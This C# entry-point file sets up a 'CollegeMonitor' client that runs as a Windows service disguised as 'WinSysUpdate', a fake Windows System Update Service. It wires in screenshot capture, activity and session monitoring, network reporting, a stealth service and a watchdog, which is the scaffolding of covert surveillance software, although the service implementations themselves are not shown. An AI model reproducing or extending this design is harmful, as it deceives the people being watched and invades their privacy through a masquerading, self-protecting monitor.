using System;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Threading.Tasks;
using Microsoft.Extensions.Configuration;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Hosting;
using Microsoft.Extensions.Logging;
using CollegeMonitor.Client.Services;
using CollegeMonitor.Client.Configuration;

namespace CollegeMonitor.Client;

/// <summary>
/// Main entry point for the Windows Service client
/// Runs as "WinSysUpdate" - Windows System Update Service
/// </summary>
internal static class Program
{
    private static readonly string ServiceName = "WinSysUpdate";
    
    /// <summary>
    /// Main entry point
    /// </summary>
    private static async Task<int> Main(string[] args)
    {
        // Check if running as service or console
        var isService = !(Debugger.IsAttached || args.Contains("--console"));
        
        var builder = CreateHostBuilder(args, isService);
        
        if (isService)
        {
            // Run as Windows Service
            await builder.Build().RunAsync();
            return 0;
        }
        else
        {
            // Run as console application for debugging
            Console.WriteLine($"Starting {ServiceName} in console mode...");
            Console.WriteLine("Press Ctrl+C to stop");
            
            var host = builder.Build();
            await host.StartAsync();
            
            // Wait for shutdown signal
            var cts = new CancellationTokenSource();
            Console.CancelKeyPress += (sender, e) =>
            {
                e.Cancel = true;
                cts.Cancel();
            };
            
            try
            {
                await Task.Delay(Timeout.Infinite, cts.Token);
            }
            catch (OperationCanceledException)
            {
                // Expected
            }
            
            await host.StopAsync();
            return 0;
        }
    }
    
    /// <summary>
    /// Creates the host builder with all services configured
    /// </summary>
    private static IHostBuilder CreateHostBuilder(string[] args, bool isService)
    {
        return Host.CreateDefaultBuilder(args)
            .UseContentRoot(GetContentRoot())
            .ConfigureAppConfiguration((context, config) =>
            {
                config.SetBasePath(GetContentRoot())
                      .AddJsonFile("appsettings.json", optional: false, reloadOnChange: true)
                      .AddJsonFile($"appsettings.{context.HostingEnvironment.EnvironmentName}.json", optional: true, reloadOnChange: true)
                      .AddEnvironmentVariables(prefix: "COLLEGEMONITOR_")
                      .AddCommandLine(args);
            })
            .ConfigureServices((context, services) =>
            {
                // Configuration
                services.Configure<ServiceConfig>(context.Configuration.GetSection("Service"));
                services.Configure<ServerConfig>(context.Configuration.GetSection("Server"));
                services.Configure<MonitoringConfig>(context.Configuration.GetSection("Monitoring"));
                services.Configure<StorageConfig>(context.Configuration.GetSection("Storage"));
                services.Configure<SecurityConfig>(context.Configuration.GetSection("Security"));
                services.Configure<LoggingConfig>(context.Configuration.GetSection("Logging"));
                
                // Core services
                services.AddSingleton<IConfigurationService, ConfigurationService>();
                services.AddSingleton<ILocalStorageService, LocalStorageService>();
                services.AddSingleton<ISystemInfoService, SystemInfoService>();
                services.AddSingleton<IUserSessionService, UserSessionService>();
                services.AddSingleton<IActivityMonitorService, ActivityMonitorService>();
                services.AddSingleton<IScreenshotService, ScreenshotService>();
                services.AddSingleton<INetworkService, NetworkService>();
                services.AddSingleton<IStealthService, StealthService>();
                services.AddSingleton<IWatchdogService, WatchdogService>();
                services.AddSingleton<IIntegrityService, IntegrityService>();
                
                // Hosted services (background workers)
                services.AddHostedService<ClientHostedService>();
                
                // Windows Service integration
                if (isService)
                {
                    services.AddWindowsService(options =>
                    {
                        options.ServiceName = ServiceName;
                    });
                }
            })
            .ConfigureLogging((context, logging) =>
            {
                logging.ClearProviders();
                logging.AddConfiguration(context.Configuration.GetSection("Logging"));
                
                if (context.Configuration.GetValue<bool>("Logging:LogToEventLog"))
                {
                    logging.AddEventLog(new EventLogSettings
                    {
                        SourceName = ServiceName,
                        LogName = "Application"
                    });
                }
                
                if (context.Configuration.GetValue<bool>("Logging:LogToFile"))
                {
                    logging.AddFile(context.Configuration.GetValue<string>("Logging:LogFilePath") ?? "");
                }
                
                logging.AddConsole();
                logging.SetMinimumLevel(Enum.Parse<LogLevel>(context.Configuration.GetValue<string>("Logging:LogLevel") ?? "Information"));
            });
    }
    
    /// <summary>
    /// Gets the content root directory
    /// </summary>
    private static string GetContentRoot()
    {
        // When published as single file, the assembly location is the extracted bundle
        var assembly = Assembly.GetEntryAssembly() ?? Assembly.GetExecutingAssembly();
        var location = assembly.Location;
        
        // If running from single-file publish, use the directory containing the executable
        if (!string.IsNullOrEmpty(location))
        {
            return Path.GetDirectoryName(location) ?? AppDomain.CurrentDomain.BaseDirectory;
        }
        
        return AppDomain.CurrentDomain.BaseDirectory;
    }
}